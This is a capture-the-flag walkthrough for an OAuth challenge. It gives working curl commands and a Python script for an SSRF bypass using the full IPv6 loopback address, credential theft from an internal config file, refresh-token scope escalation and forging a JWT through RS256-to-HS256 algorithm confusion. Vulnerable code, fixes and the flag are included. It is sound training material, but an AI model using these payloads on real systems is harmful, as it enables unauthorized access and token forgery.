# OAuth CTF Challenge - Complete Solution Guide

## 🎯 Challenge Overview

**Difficulty:** ⭐⭐⭐⭐⭐ (Advanced / Expert)
**Expected Time:** 2-4 hours
**Skills Tested:**
- SSRF (Server-Side Request Forgery)
- IPv6 Bypass Techniques
- OAuth 2.0 Security
- JWT (JSON Web Token) Vulnerabilities
- Algorithm Confusion Attacks
- Privilege Escalation

---

## 📋 Vulnerability Chain

```
1. SSRF via logo_uri (IPv6 Full Notation Bypass)
   ↓
2. Admin Credential Theft (/internal/admin/dev-config.json)
   ↓
3. OAuth Authorization (Admin Account)
   ↓
4. 2-Stage Scope Escalation (read → write → ADMIN_SECRETS)
   ↓
5. JWT Algorithm Confusion (RS256 → HS256)
   ↓
6. FLAG Capture (/api/admin/flag)
```

---

## 🔍 Step-by-Step Solution

### Step 1: Reconnaissance

**Goal:** Discover internal endpoints and service topology

```bash
# Check robots.txt
curl http://localhost:8000/robots.txt

# Output:
# Disallow: /internal/admin/
# Note: Service topology information available at /.well-known/oauth-authorization-server
```

```bash
# Check OAuth discovery
curl http://localhost:8000/.well-known/oauth-authorization-server | jq

# Key findings:
# - jwks_uri: http://localhost:8000/.well-known/jwks.json
# - service_topology: {
#     "auth": "auth-server:8000",
#     "api": "resource-server:8002"
#   }
# - internal_documentation: "/internal/admin/"
```

**Findings:**
- Internal admin endpoint exists: `/internal/admin/`
- Services communicate internally via different addressing
- JWKS endpoint available (hint for JWT attacks)

---

### Step 2: SSRF Attack - IPv6 Full Notation Bypass

**Goal:** Bypass SSRF filters to access internal `/internal/admin/dev-config.json`

#### 2.1 Test Common Bypasses (All Blocked)

```bash
# These will all be blocked:
http://127.0.0.1:8000
http://localhost:8000
http://127%2e0%2e0%2e1:8000       # URL encoding (lowercase)
http://127%2E0%2E0%2E1:8000       # URL encoding (uppercase)
http://0x7f.0.0.1:8000            # Hex IP
http://0x7f.0x0.0x0.0x1:8000      # Full hex
http://[::1]:8000                 # IPv6 shorthand

# Error response:
{
  "error": "ssrf_blocked",
  "message": "Access to localhost and private networks is blocked"
}
```

#### 2.2 IPv6 Full Notation Bypass (✅ Works!)

**Key Insight:** The SSRF filter checks for `::` (double colon) in IPv6 addresses but doesn't validate `is_loopback` for full notation!

```python
# The vulnerable code (auth-server/app_sqlite.py):
elif isinstance(ip, ipaddress.IPv6Address):
    if '::' in hostname_lower:  # Only blocks shorthand
        return True
    # 🔥 BUG: Doesn't check ip.is_loopback for full notation!
```

**Exploit:**

```bash
curl -X POST http://localhost:8000/oauth/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Exploit Client",
    "redirect_uris": ["http://localhost:8080/callback"],
    "logo_uri": "http://[0:0:0:0:0:0:0:1]:8000/internal/admin/dev-config.json"
  }'
```

**Response:**

```json
{
  "client_id": "client_abc123...",
  "client_secret": "secret_xyz789...",
  "logo_fetch_result": {
    "status": 200,
    "content": "{\"environment\":\"development\",\"admin_accounts\":[{\"username\":\"MSG_CTF_HACKER\",\"password\":\"Wh3r3_is_SSRF?!\",\"role\":\"admin\",\"user_id\":\"user_admin_001\"}],\"trusted_clients\":[...]}"
  }
}
```

**Credentials Obtained:**
- Username: `MSG_CTF_HACKER`
- Password: `Wh3r3_is_SSRF?!`
- User ID: `user_admin_001`

---

### Step 3: OAuth Authorization Flow

**Goal:** Obtain initial access token using admin credentials

#### 3.1 Start Authorization

```bash
AUTH_URL="http://localhost:8000/oauth/authorize"
PARAMS="client_id=msg_developer_portal&redirect_uri=http://localhost:8080/auth/callback&response_type=code&scope=read%20write%20ADMIN_SECRETS&state=random123"

curl -X POST "${AUTH_URL}" \
  -d "client_id=msg_developer_portal" \
  -d "redirect_uri=http://localhost:8080/auth/callback" \
  -d "response_type=code" \
  -d "scope=read write ADMIN_SECRETS" \
  -d "state=random123" \
  -d "username=MSG_CTF_HACKER" \
  -d "password=Wh3r3_is_SSRF?!" \
  -d "action=login" \
  -i
```

**Response:**
```
HTTP/1.1 302 Found
Location: http://localhost:8080/auth/callback?code=code_abc123...&state=random123
```

#### 3.2 Exchange Code for Tokens

```bash
curl -X POST http://localhost:8000/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=code_abc123..." \
  -d "redirect_uri=http://localhost:8080/auth/callback" \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024"
```

**Response:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "refresh_xyz789...",
  "scope": "read"
}
```

**Note:** Despite requesting all scopes, we only get `read` - this forces scope escalation.

---

### Step 4: 2-Stage Scope Escalation

**Goal:** Escalate from `read` → `write` → `ADMIN_SECRETS`

#### 4.1 Stage 1: read → write

```bash
curl -X POST http://localhost:8000/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=refresh_xyz789..." \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "scope=read write"
```

**Response:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read write",
  "token_algorithm": "RS256"
}
```

#### 4.2 Stage 2: write → ADMIN_SECRETS (Admin Only)

```bash
curl -X POST http://localhost:8000/oauth/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=refresh_xyz789..." \
  -d "client_id=msg_developer_portal" \
  -d "client_secret=dev_portal_secret_2024" \
  -d "scope=read write ADMIN_SECRETS"
```

**Response:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read write ADMIN_SECRETS",
  "token_algorithm": "RS256",
  "admin_access": true,
  "note": "Token signed with RS256. Verify algorithm support on resource server."
}
```

---

### Step 5: JWT Algorithm Confusion Attack

**Goal:** Convert RS256 token to HS256 using public key as HMAC secret

#### 5.1 Test RS256 Token (Will Fail)

```bash
curl -X GET http://localhost:8002/api/admin/flag \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
```

**Response:**
```json
{
  "error": "algorithm_not_supported",
  "message": "This endpoint requires HS256 tokens for legacy compatibility",
  "current_algorithm": "RS256",
  "required_algorithm": "HS256",
  "hint": "Internal microservices use symmetric signing. Check auth server documentation."
}
```

**Key Discovery:** `/api/admin/flag` **only accepts HS256** tokens!

#### 5.2 Fetch Public Key

```bash
# Get JWKS
curl http://localhost:8000/.well-known/jwks.json

# Or get PEM directly
curl http://localhost:8000/.well-known/public-key.pem > public_key.pem
```

#### 5.3 Forge HS256 Token

**Python Script:**

```python
import jwt

# Decode RS256 token (without verification)
rs256_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
payload = jwt.decode(rs256_token, options={"verify_signature": False})

# Load public key
with open('public_key.pem', 'r') as f:
    public_key = f.read()

# Sign with HS256 using public key as secret
hs256_token = jwt.encode(
    payload,
    public_key,      # 🔥 Public key as HMAC secret!
    algorithm='HS256'
)

print(f"Forged HS256 token: {hs256_token}")
```

**How It Works:**

```
Normal RS256 Verification:
  jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])
  → Uses public key to verify RSA signature ✅

Vulnerable HS256 Verification (Algorithm Confusion):
  jwt.decode(token, PUBLIC_KEY, algorithms=['HS256'])
  → Uses public key as HMAC secret ⚠️
  → Attacker can forge tokens by signing with public key!
```

**Vulnerable Code (resource-server/app.py):**

```python
def verify_token(token):
    header = jwt.get_unverified_header(token)
    algorithm = header.get('alg', 'RS256')  # 🔥 Trusts header!

    public_key = get_public_key()

    if algorithm == 'RS256':
        payload = jwt.decode(token, public_key, algorithms=['RS256'])
    elif algorithm == 'HS256':
        # 🔥 VULNERABILITY: Uses public key as HMAC secret!
        payload = jwt.decode(token, public_key, algorithms=['HS256'])
```

---

### Step 6: Capture the FLAG

```bash
curl -X GET http://localhost:8002/api/admin/flag \
  -H "Authorization: Bearer <FORGED_HS256_TOKEN>"
```

**Response:**

```json
{
  "success": true,
  "message": "Administrative access granted",
  "flag": "MSG{0auth_2_MSG_FLAG_m4st3r}",
  "user_id": "user_admin_001",
  "algorithm_used": "HS256",
  "admin_data": {
    "database_key": "database_master_key_2024",
    "api_token": "admin_api_override_token",
    "research_notes": "jwt_algorithm_confusion_analysis"
  },
  "access_level": "ADMIN_SECRETS",
  "timestamp": "2025-01-15T10:30:45.123456"
}
```

**🚩 FLAG: `MSG{0auth_2_MSG_FLAG_m4st3r}` 🚩**

---

## 🛠️ Automated Exploit

Run the provided exploit script:

```bash
python3 exploit_complete.py
```

---

## 🔐 Vulnerabilities Explained

### 1. SSRF via IPv6 Full Notation

**CWE-918: Server-Side Request Forgery**

```python
# Vulnerable code
elif isinstance(ip, ipaddress.IPv6Address):
    if '::' in hostname_lower:
        return True
    # Missing: if ip.is_loopback: return True
```

**Fix:**
```python
elif isinstance(ip, ipaddress.IPv6Address):
    if ip.is_loopback or ip.is_private:
        return True
```

### 2. Insufficient Scope Validation

**CWE-285: Improper Authorization**

Initial authorization should enforce requested scopes, not override them.

**Fix:** Implement proper scope validation in authorization endpoint.

### 3. JWT Algorithm Confusion

**CWE-347: Improper Verification of Cryptographic Signature**

```python
# Vulnerable
algorithm = header.get('alg')  # Trusts user input!
jwt.decode(token, key, algorithms=[algorithm])
```

**Fix:**
```python
# Secure: Explicitly specify expected algorithm
jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])

# Or validate before accepting
ALLOWED_ALGORITHMS = ['RS256']
if algorithm not in ALLOWED_ALGORITHMS:
    raise ValueError("Unsupported algorithm")
```

---

## 📚 Learning Resources

### SSRF & IPv6
- [HackTricks - SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [IPv6 Security Implications](https://www.rapid7.com/blog/post/2016/06/08/ipv6-security/)

### OAuth 2.0 Security
- [OAuth 2.0 Threat Model (RFC 6819)](https://datatracker.ietf.org/doc/html/rfc6819)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

### JWT Algorithm Confusion
- [Auth0 JWT Algorithm Confusion Vulnerability (CVE-2015-9235)](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [Practical JWT Algorithm Confusion](https://portswigger.net/web-security/jwt/algorithm-confusion)

---

## 🏆 Credits

**Challenge Design:** Advanced OAuth Security CTF
**Difficulty:** Expert (⭐⭐⭐⭐⭐)
**Concepts:** SSRF, OAuth 2.0, JWT, Cryptographic Attacks

---

## ⚠️ Disclaimer

This challenge is for educational purposes only. These techniques should only be used in authorized security testing and CTF competitions.
